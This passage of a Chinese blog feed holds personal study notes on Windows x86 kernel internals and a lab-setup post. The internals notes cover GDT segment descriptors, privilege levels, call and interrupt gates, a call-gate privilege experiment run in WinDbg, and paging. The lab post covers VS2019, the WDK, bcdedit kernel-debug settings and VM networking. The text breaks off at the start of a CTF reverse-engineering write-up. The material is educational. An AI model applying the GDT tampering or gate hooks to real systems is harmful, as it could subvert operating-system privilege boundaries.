[val2],eax;</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(&quot;cs=0x%x\n&quot;,val2);</span><br><span class="line">    //0x1b</span><br><span class="line"></span><br><span class="line">    //对base的探测</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov ax,0x4b;        //这里用windbg将对应gdt表动过，也就是让base+1了</span><br><span class="line">        mov ds,ax;</span><br><span class="line">        mov eax,dword ptr ds:[val];</span><br><span class="line">        mov dword ptr ss:[val2],eax;</span><br><span class="line">        //mov cx,es;</span><br><span class="line">        //mov ds,cx;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;0x%x\n&quot;,val2);</span><br><span class="line">    //正常来说这里是100，但是如果改变base基地址，那么赋值的时候eax给的就是base+offset val2+1，，没有改变val2地址的值，后面恢复了ds就正常了</span><br><span class="line">    //同理，将前面的恢复环境注释掉，后面再恢复</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov cx,es;</span><br><span class="line">        mov ds,cx;</span><br><span class="line">    &#125;</span><br><span class="line">    //若是这样子，应该是没有变化的</span><br><span class="line"></span><br><span class="line">    ////对段长度的探测</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        //limit</span><br><span class="line">        //mov eax,fs:[0x1000-4];//这里如果是0x1000-4 - 0x1000之内的都会出错，因为超出大小了</span><br><span class="line">        //mov val2,eax;</span><br><span class="line">        //p</span><br><span class="line">        //在gdt表中将p改成0就可以无效了，这里正常运行上面的那个代码就会报错</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;fs:[0]=0x%x\n&quot;,val2);</span><br><span class="line"></span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次总结一下，cs,ds这些段如果是cs:[x]，那么会调用代码段中的x地址，但是如果只是cs，也就是cs中的值，并不是基地址，而是段选择符，也就是可以拆解的，有时候就会去对照gdt表，然后查看gdt里的东西</p><h4 id="d-b"><a href="#d-b" class="headerlink" title="d&#x2F;b"></a>d&#x2F;b</h4><p>话解上题，通过windbg更改端段描述符cs,ds可以做到全局改变，d&#x2F;b的作用是用来规定操作符大小的，比如正常push指令push的是一字节，但是如果d&#x2F;b位改变，这里有可能只push一字等，也就是本来的push xx xx xx xx就会变成push xx xx</p><p>个人感觉就像是改变这个电脑是32位还是16位还是64位，存在用处也很明显，就是可以兼容低版本（这里注意改变的是段描述符里的d&#x2F;b也就是说，该段相关改变，比如ss(栈)改了的话，call指令就会有问题，因为call相当于pop jmp，但是操作字节变少了，原本是call 0x12345678，pop出来就只有0x1234，jmp 0x1234，所以就会出现问题<img src="/.io//tool\blog\source\postpic\windows1\10.png" loading="lazy"></p><p>win系统内部权限分化，R0和R3是内核层和应用层，这个倒是很好理解，去调用</p><p>判别当前代码是当前层的办法就是CS和SS</p><p>这里阐述一个观点，段的存在是划分硬件资源的，内存中是线性排列的一群1和0，是段来定位划分每一块的作用，最后cs，ss，ds诸如此类的段就是对这个划分块的描述</p><p>DPL: Descriptor Privilege Level 描述符特权级  </p><p>CPL: Current Privilege Level 当前特权级  CS段描述符的DPL</p><p>RPL: Request Privilege Level  请求者特权级  CS DS SS，在段描述符的后三位</p><p><img src="/.io//tool\blog\source\postpic\windows1\11.png" loading="lazy"></p><p>这里卡了有点久，起初我不是很理解gpt所说的</p><table><thead><tr><th><strong>段类型</strong></th><th><strong>DPL 规则</strong></th></tr></thead><tbody><tr><td><strong>代码段</strong></td><td><strong>CPL ≤ DPL</strong></td></tr><tr><td><strong>数据段</strong></td><td><strong>max(CPL, RPL) ≤ DPL</strong></td></tr><tr><td><strong>栈段（SS）</strong></td><td><strong>RPL&#x3D;CPL &#x3D; DPL</strong></td></tr></tbody></table><p>上述表格，但是结合上图就会发现，0才是内核层，假如现在代码是内核代码，那么这段代码的DPL就是0，如果你自己写了一段代码，那么大概率在R3，应用层，此时你的代码描述符cs里的CPL就会是3（DPL应该也是3）</p><p>此时如果你要调用内核层的代码，则会访问失败(但我不知道这个怎么调用)</p><p>以此类推，后两个也不难理解</p><h3 id="提权跳转-符"><a href="#提权跳转-符" class="headerlink" title="提权跳转-符"></a>提权跳转-符</h3><p> 嗯后面的我好像也懂了，补刚刚的坑，那么众所周知cs在应用层是23，那么</p><p>call 23h:0040100h就是跳转到当前程序的0x401000地址，并且跳跃过去的段权限对应是3，那么在gdt表中把一个无用位置改成CPL值为2的cs，然后手动call 48h:4010000h，48就是改变的gdt表导向，也就是call提权</p><p>那么跳转指令还有jmp\ret\retf等等，这些的跳转可以不可以提权呢</p><p>jmp 在调用门 只能同权限跳转</p><p>retf 只能同权限或向低权限跳转</p><p>call 同权限或提权</p><p>本来换下一节课了，听到调用门一愣，调用门似乎他没说，我不清楚为什么感觉容易漏东西，所以自己补了一下，网上找了一篇<a href="https://www.cnblogs.com/iBinary/p/13264239.html#%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E7%AC%AC%E4%BA%94%E8%AE%B2-%E9%97%A8-%E8%B0%83%E7%94%A8%E9%97%A8">文章</a>讲的还不错</p><p>我一看这个调用门描述符，和段描述符十分相似</p><p>所以段又描述符，调用门也有？后面看来好像是这样的，而且构造和段描述符差不多</p><p>我去，，，误会了我没看到这节课，好吧回来接着学</p><p>那么前面说的和提权跳转差不多，当然也有可能是这两个本来就是一样的，所以我决定好好复现这个程序</p><p>那么首先我们要获得cs的值，并且分解分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int a;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov ax,cs;</span><br><span class="line">        mov a,eax;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%x&quot;,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里获取的值是1b -&gt;0001 1011，也就是3的位置</p><p>r gdtr获取地址-80b98800</p><p>dp 80b98800后发现80b98848后的位置适合放更改DPL的位置</p><p>原值是0000ffff 00cffb00-f-1111-DPL-11</p><p>需要改成DPL-00-1001-9-0000ffff 00cf9b00</p><p>我突然发现有现成的1，其实可以改成0000 1011- b</p><p>那么接下来要获得函数的地址-0x0401000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"></span><br><span class="line">void __declspec(naked) test()&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        retf;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%x\n&quot;,test);//0x0401000</span><br><span class="line">    </span><br><span class="line">    char bufcode[6]=&#123; 0x00, 0x0, 0x0, 0, 0x48, 0&#125;;</span><br><span class="line">    *(int *)&amp;bufcode[0]=(int )test;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        //push addr;</span><br><span class="line">        //jmp fword ptr bufcode;</span><br><span class="line">        jmp far bufcode;</span><br><span class="line">addr:</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int 3</p><p>哈哈中断一下，因为确实这里中断了好几次，我当时自己写的代码一直都不能跑，会中断，我复现课里的内容也还是不可以，最后发现他改的是 00cffb00&#96;0000ffff</p><p>欸？这不是没改嘛，对就是没改，那不对呀，没改怎么提权了，哎这里真的想了很久，因为RPL在段描述符中，他用的是48，0100 1000，RPL是0，R0层，哦对他也没说这个实验可以提权，而是申请对吧</p><p>。。所以这里就是这个啊。。。哎不记了接着看，反正也懂了，始终切记DPL在gdt里，RPL在段描述符里</p><h2 id="系统段描述符"><a href="#系统段描述符" class="headerlink" title="系统段描述符"></a>系统段描述符</h2><p>这里的门是系统段的门，也算是描述符，就像是指引路的传送门，比如调用门，门后的就是代码段，中断门，门后的是处理中断的代码段，任务门门后的是TSS任务段</p><p>还是看完再测试比较好</p><h3 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h3><p>调用门作用是跳转提供基地址等一系列参数的</p><p>具体框架在另一篇文章，这里只阐述注意点</p><p>1.调用门即地址前寻址的cs ds ss，但是并不是段选择符的那些cs ds ss，call jmp等指令使用到调用门时便遵循调用门解析跳转</p><p>2.jmp xx:aaaa 遵循xx的地址跳转</p><p>3.提权跳转，先解析需跳转地址，构造出对应的调用门</p><p>4.调用门结构中Segment Selector(段选择符)就是前面的符，以符来作为基地址跳转，所以在这里可以选择R0或R3层，进行提权</p><p>5.<code>jmp 在调用门 只能同权限跳转</code> | <code>retf 只能同权限或向低权限跳转</code> | <code>call 同权限或提权</code></p><h3 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h3><p>中断门作用是int系列或中断指令触发时，决定跳转到哪个地方来解决</p><p>具体框架在另一篇文章，这里只阐述注意点</p><p>1.中断门即int 1&#x2F;2&#x2F;3，当程序运行上述命令时，遵循中断门的跳转，类调用门</p><p>2.int xx 遵循xx的地址跳转</p><p>3.查看idt表，会发现，0 1 2 3会有对应可分析的中断门，每个单元都是int后对应的中断门，所以自己如果要增加中断门在32元素位置，那么中断门就是int 32</p><p>4.中断门的跳转极其类似调用门，所以不多记</p><h3 id="陷阱门"><a href="#陷阱门" class="headerlink" title="陷阱门"></a>陷阱门</h3><p>陷阱门≈中断门</p><p>陷阱门与中断门几乎一致，这里只阐述不同点</p><p>1.中断门清除eflag里的VM NT IF TF位</p><p>   陷阱门不清楚IF位，所以中断门会造成阻塞，需要iretd来返回，或者在进入中断门之前sti，陷阱门不必</p><h3 id="任务门"><a href="#任务门" class="headerlink" title="任务门"></a>任务门</h3><p>在不同段跳转的时候，比如R0跳R3这种跨段跳转的时候，栈(ss)环境和esp是会改变的，前面实验就能看出</p><p>所以任务门担任的就是承接作用ps:框架越来越完善了</p><p>还是老规矩，这里只阐述注意点</p><ol><li></li></ol><h2 id="基于中断门的hook-int-3-hook"><a href="#基于中断门的hook-int-3-hook" class="headerlink" title="基于中断门的hook int 3 hook"></a>基于中断门的hook int 3 hook</h2><p>通过更改int 3对应cs段基地址然后触发int 3hook到自己的函数</p><h2 id="101012"><a href="#101012" class="headerlink" title="101012"></a>101012</h2><p>这里火哥的课就又开始”架空”起来了，很多新名词完全没有说过，看一下这篇文章-<a href="https://blog.csdn.net/qq_41988448/article/details/102624243">101012部分</a>，火哥的课不行就跳过这一节，里面也说了”Cr3”</p><p>插个眼，这里<code>! process 0 0</code>这个指令还不太懂物理地址懂一半，之前搞项目那会学了一点，但是没太深入，我估计后面学页的时候可以相辅相成</p><p>前进一小步，文明一大步</p><p>——男厕</p><h2 id="页の前章"><a href="#页の前章" class="headerlink" title="页の前章"></a>页の前章</h2><h3 id="线性地址对应物理地址"><a href="#线性地址对应物理地址" class="headerlink" title="线性地址对应物理地址"></a>线性地址对应物理地址</h3><p>假如我在记事本中写了一串字符”helloworld”，然后用工具比如CE查找到该字符串在内存中的地址00484C58那么可以按照10-10-12的方式解析该虚拟地址的物理地址，所谓101012就是bit位排布，首先把000AE928换成二进制bit位形式0000 0000 0100 1000 0100 1100 0101 1000，然后划分</p><p>1000 0000 00011页目录单位1*4bytePDE</p><p>1000 1000 010084页表项单位1*4bytePTE</p><p>121100 0101 1000C58页内偏移单位1byte</p><p>于是就可以找物理地址了，于是就弥补了前文的无知，cr3是什么？cr3就是改进程(书)地址的寄存器，代表了该书，用! process 0 0列举所有cr3的值找到notepad.exe，得到物理基地址03d75000  </p><p>! dd 03d75000来获取目录物理地址的值，目录中存放的是指针，也不难想到指针指向的地方就是书本内容的地方，比如这个要找的就是! dd 03d75000+1<em>4-&gt;3cbc7867，这里要去掉867，这个是页属性得到3cbc7000，这就是当前页的起始地址，再接着加上84</em>4，得到3d25b867，同理3d25b000，于是就可以看里面的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !db 3d25b000+C58</span><br><span class="line">#3d25bc58 68 00 65 00 6c 00 6c 00-6f 00 77 00 6f 00 72 00 h.e.l.l.o.w.o.r.</span><br><span class="line">#3d25bc68 6c 00 64 00 31 00 31 00-00 00 00 00 00 00 00 00 l.d.1.1.........</span><br><span class="line">#3d25bc78 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span><br><span class="line">#3d25bc88 00 00 00 00 00 00 00 00-08 00 00 08 58 82 00 00 ............X...</span><br><span class="line">#3d25bc98 50 87 48 00 70 e9 47 00-06 00 00 06 5a 82 00 00 P.H.p.G.....Z...</span><br><span class="line">#3d25bca8 50 87 48 00 70 e9 47 00-00 00 00 00 04 00 3b 00 P.H.p.G.......;.</span><br><span class="line">#3d25bcb8 9b a1 37 7b 40 82 00 00-90 4a 48 00 68 09 48 00 ..7&#123;@....JH.h.H.</span><br><span class="line">#3d25bcc8 61 00 72 00 73 00 f6 ff-89 a1 36 68 4e 82 00 08 a.r.s.....6hN...</span><br></pre></td></tr></table></figure><h3 id="页属性"><a href="#页属性" class="headerlink" title="页属性"></a>页属性</h3><p>当直接查看CR3的时候，看到的后三位并不是0，其实这里代表的就是页属性<img src="/.io//tool\blog\source\postpic\windows1\12.png" loading="lazy"></p><p>可以对照该表</p><h4 id="P"><a href="#P" class="headerlink" title="P"></a>P</h4><p>0代表无效</p><h4 id="US"><a href="#US" class="headerlink" title="US"></a>US</h4><p>1代表R3可访问，0代表R0才能访问</p><h4 id="A"><a href="#A" class="headerlink" title="A"></a>A</h4><p>是否被改变过，改变1</p><h4 id="G"><a href="#G" class="headerlink" title="G"></a>G</h4><p>如果是1的话，是不会刷新缓存值的</p><p>没什么可记的，看完课就好 </p><h2 id="页の终章"><a href="#页の终章" class="headerlink" title="页の终章"></a>页の终章</h2><h3 id="挂页"><a href="#挂页" class="headerlink" title="挂页"></a>挂页</h3><p>VirtrualAlloc申请地址在赋值前是不会挂物理页的，在memset等操作进行之后才会赋值，又众所周知，0地址是不可赋值的，因为0地址没有挂物理页，那么就会有一种程序，给0地址挂页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// study05.cpp : 定义控制台应用程序的入口点。</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int *a = 0;</span><br><span class="line"></span><br><span class="line">    int * x = (int* )VirtualAlloc(NULL,0x100,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memset(x,0,0x100);</span><br><span class="line">    printf(&quot;%x\n&quot;,x);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    //手动挂页 </span><br><span class="line">    *a=100;</span><br><span class="line">    printf(&quot;%x\n&quot;,*x);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">这个还是很好玩的</span><br></pre></td></tr></table></figure><h3 id="页下"><a href="#页下" class="headerlink" title="页下"></a>页下</h3><p>这个感觉不太好记，比较散，应该也不容易忘就不急了，记脑子里</p><h3 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h3><p>虚拟页帧 物理页帧 attr属性 次数 PCID</p><p>本质是缓存，里面可以临时存储最近用过的联系？然后再次使用的时候可以先碰撞TLB，看看有没有现成的联系，没有再拆</p>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindowsStudy00-配置环境</title>
      <link href="/2025/03/28/WindowsStudy00-%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/03/28/WindowsStudy00-%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>windows内核学习前文——配置环境</p><p>开始内核学习前先配置一下环境与驱动编译环境</p><span id="more"></span><p>学习windows貌似要配三个</p><p>win7 x86,win7 x64,win10</p><p>以win7 x86为例</p><p>镜像地址：<a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p><p>装镜像：<a href="https://blog.csdn.net/weixin_48886225/article/details/134124245">https://blog.csdn.net/weixin_48886225&#x2F;article&#x2F;details&#x2F;134124245</a></p><p>扩展盘：<a href="https://zhuanlan.zhihu.com/p/95133122">https://zhuanlan.zhihu.com/p/95133122</a></p><h2 id="VS-win7"><a href="#VS-win7" class="headerlink" title="VS&amp;win7"></a>VS&amp;win7</h2><p>有点难受，我在配置win7x64的时候发现总是没有网络，以及VMtools始终安装不上</p><p>现在的主线任务其实就是在一个win7虚拟机上下载一个VS2019</p><p>今天再次尝试vm tools响应了，但是中途卡死了，初次猜测是运行内存给少了（我给了4个g）我关机换了8个g再试试</p><p>仍然卡死了，主界面会有一个弹窗一直在卡住，导致点不了别的选项我再找找文章</p><p>也是踩了坑，其实下载VS2019可以在主机也就是自己的电脑上下载。。。</p><p>所以我把2022卸了，下载2019<a href="https://blog.csdn.net/weixin_44711063/article/details/117164628">https://blog.csdn.net/weixin_44711063&#x2F;article&#x2F;details&#x2F;117164628</a>这里有相关文章</p><p>那么还有一个注意的坑（我踩了），WDK是驱动开发的扩展，正确顺序是VS2019-&gt;WDK</p><p>但是我没注意反过来了，先安装的WDK，所以没有显示出驱动开发项目所以需要重新安装，我这里第一次尝试点击修复，等待会好了看看可不可以。。。驱动开发好多坑啊</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg)</span> &#123;</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个测试程序，这个程序是用来查看你的SDK和WDK的区别的</p><p>报错：严重性代码说明项目文件行禁止显示状态</p><p>错误MSB8040此项目需要缓解了 Spectre 漏洞的库。从 Visual Studio 安装程序(单个组件选项卡)为正在使用的任何工具集和体系结构安装它们。了解详细信息: <a href="https://aka.ms/Ofhn4c">https://aka.ms/Ofhn4c</a>MyDriver2C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Microsoft\VC\v160\Microsoft.CppBuild.targets486</p><p>解决文章：<a href="https://blog.csdn.net/wangzhichunnihao/article/details/108584295">https://blog.csdn.net/wangzhichunnihao/article/details/108584295</a></p><p>网盘课程中接下来才说要用到虚拟机win7，他推荐使用Homebasic家庭版</p><p>将win7x86先下载下来然后直接默认配置，出现第一个问题，vmtools安装不了<a href="https://blog.csdn.net/teisite/article/details/117675403">https://blog.csdn.net/teisite/article/details/117675403</a>，这个文章说了办法，这里需要补充</p><p>1.3<font style="color:rgb(34, 34, 38);">CDaemon</font><a href="https://blog.csdn.net/NeverGUM/article/details/101535864">https://blog.csdn.net/NeverGUM/article/details/101535864</a></p><p>2.3CDaemon汉化地址<a href="https://gitcode.com/open-source-toolkit/d3b1c/?utm_source=tools_gitcode&index=top&type=card&&isLogin=1">GitCode - 全球开发者的开源社区,开源代码托管平台</a></p><p>3.SHA2算法升级<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=kb4474419">https://www.catalog.update.microsoft.com/Search.aspx?q=kb4474419</a></p><h3 id="3CDaemon"><a href="#3CDaemon" class="headerlink" title="3CDaemon"></a>3CDaemon</h3><h3 id><a href="#" class="headerlink" title></a><img src="/.io//tool\blog\source\postpic\windows0\3C0.png" loading="lazy"></h3><p>第二个是自己的端口号，需要下载本机上文件的需要以下指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp &lt;ip端口号&gt;</span><br><span class="line">用户名</span><br><span class="line">密码</span><br></pre></td></tr></table></figure><p>然后相当于连接上了本机，此时本机的设置的那个文件夹就相当于服务器了</p><p>接着用命令get xxx，来获取xxx</p><p>。。。。这里我踩了个巨坑<img src="/.io//tool\blog\source\postpic\windows0\3C1.png" loading="lazy"></p><p>镜像选下面这个，sp1才支持SHA1算法升级到SHA2，然后才可以安装VMtools</p><p>好好好这是第二个废系统了，那么接下来就是win7x86sp1-&gt;SHA2.msu-&gt;移除软盘-&gt;setup</p><p>发现迅雷一个毛病，下载到99.99%就直接卡住，我重启试试</p><h3 id="eMule"><a href="#eMule" class="headerlink" title="eMule"></a>eMule</h3><p>。。。我真无语了，迅雷就是下不好，两天了，最后0.01%还没下好，无奈只能换一个工具，最近感觉把能踩的坑都踩了，emule和迅雷一样是用于下载的？</p><p>官网：<a href="https://www.emule-project.com/home/perl/general.cgi?l=42&rm=download">https://www.emule-project.com/home/perl/general.cgi?l=42&rm=download</a></p><p>先更新下载源<a href="http://upd.emule-security.org/nodes.dat">http://upd.emule-security.org/nodes.dat</a></p><p>然后直接在下载界面复制即可（不过下载速度慢的捉急）</p><h3 id="迅雷"><a href="#迅雷" class="headerlink" title="迅雷"></a>迅雷</h3><p>最后我发现，先转存网盘（迅雷网盘）然后下载网盘内容，就不会卡死了</p><p>至此我的win7x64x32就搞定了</p><h2 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h2><p>小tips：右键cmd，点标记就可以复制了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bcdedit</span><br><span class="line"></span><br><span class="line">bcdedit /copy &#123;current&#125; /d debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bcdedit /displayorder &#123;fbf1106f-022c-11f0-a466-ab0d31d72b23&#125; /addlast</span><br><span class="line"></span><br><span class="line">bcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200</span><br><span class="line"></span><br><span class="line"> bcdedit /bootdebug &#123;fbf1106f-022c-11f0-a466-ab0d31d72b23&#125; ON</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bcdedit /debug &#123;fbf1106f-022c-11f0-a466-ab0d31d72b23&#125; ON</span><br><span class="line"></span><br><span class="line">bcdedit /timeout 30</span><br><span class="line"></span><br><span class="line">090f876d-0a19-11eb-91ce-f2d2a66b6220</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//虚拟机配置</span><br><span class="line"></span><br><span class="line">&quot;C:\Program Files (x86)\Windows Kits\8.1\Debuggers\x86\windbg.exe&quot; -y SRV*E:\symbol*http://msdl.microsoft.com/download/symbols -b -k com:port=//./pipe/com_1,baud=115200,pipe</span><br><span class="line"></span><br><span class="line">环境变量配置</span><br><span class="line">_NT_SYMBOL_PATH</span><br><span class="line"></span><br><span class="line">SRV*E:\symbol* https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>添加串行端口<a href="https://blog.csdn.net/qq_33406883/article/details/106549466">https://blog.csdn.net/qq_33406883&#x2F;article&#x2F;details&#x2F;106549466</a></p><p>这里两个注意，1.E:\symbol这个是用来放下载标识符的</p><p>2.&#x2F;&#x2F;.&#x2F;pipe&#x2F;com_1，这个要和串行端口使用的管道名字一致</p><h3 id="串行端口导致win786虚拟机开机黑屏"><a href="#串行端口导致win786虚拟机开机黑屏" class="headerlink" title="串行端口导致win786虚拟机开机黑屏"></a>串行端口导致win786虚拟机开机黑屏</h3><p>。。。并不是而是第一次启动的时候windbg int 3 暂停了，继续的指令是g</p><h2 id="VS2008"><a href="#VS2008" class="headerlink" title="VS2008"></a>VS2008</h2><p><a href="https://www.dotcpp.com/course/342">VS2008下载和安装图文教程</a></p><p>至此环境配置结束</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>本来结束了，后面才想起来网络还没有配置好，那么网上的文章教程主要集中于</p><p>服务里面的VM DHCP NAT开没开，是不是net方式连接，桥接的话网卡选没选对等等等</p><p>但是以上的问题我都是没有的，甚至于我ping的通主机和<a href="http://www.baidu.com，最终终于找到了一篇很合适的文章[主机和虚拟机可以互ping但虚拟机不能上网_虚拟机能ping通主机,但无法上网-CSDN博客](https://blog.csdn.net/Y5823990/article/details/115047879)">www.baidu.com，最终终于找到了一篇很合适的文章[主机和虚拟机可以互ping但虚拟机不能上网_虚拟机能ping通主机,但无法上网-CSDN博客](https://blog.csdn.net/Y5823990/article/details/115047879)</a></p><p>是的，问题所在是DNS服务器的端口和虚拟机中配置不同，问题就在于之前你的虚拟机练过别的地方的网络那么接下来你的网络DNS端口会自动保存上次的，以至于端口不对自然没有网络</p><p>所以要做的就是将DNS端口换成当前主机连接网络的DNS端口号，linux系统不必多言里面有</p><p>windows系统则是打开控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;更改适配器设置</p><p>参考文章（找不到了。。。哦有可能是gpt）</p><p><img src="/.io//tool\blog\source\postpic\windows0\1.png" loading="lazy"><br><img src="/.io//tool\blog\source\postpic\windows0\2.png" loading="lazy"><br><img src="/.io//tool\blog\source\postpic\windows0\3.png" loading="lazy"><br><img src="/.io//tool\blog\source\postpic\windows0\4.png" loading="lazy"><br><img src="/.io//tool\blog\source\postpic\windows0\5.png" loading="lazy"><br><img src="/.io//tool\blog\source\postpic\windows0\6.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nctf2025-re-wp</title>
      <link href="/2025/03/26/2025nctf/"/>
      <url>/2025/03/26/2025nctf/</url>
      
        <content type="html"><![CDATA[<p>写了逆向方向3个题，队伍第12<br><img src="/.io//tool\blog\source\postpic\2025nctf\1.png" loading="lazy"></p><span id="more"></span><h2 id="ezDos"><a href="#ezDos" class="headerlink" title="ezDos"></a>ezDos</h2><p>好像只能汇编分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">seg002:<span class="number">0000</span> seg002          segment byte public <span class="string">&#x27;CODE&#x27;</span> use16</span><br><span class="line">seg002:<span class="number">0000</span>                 assume cs:seg002</span><br><span class="line">seg002:<span class="number">0000</span>                 assume es:nothing, ss:seg001, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">seg002:<span class="number">0000</span></span><br><span class="line">seg002:<span 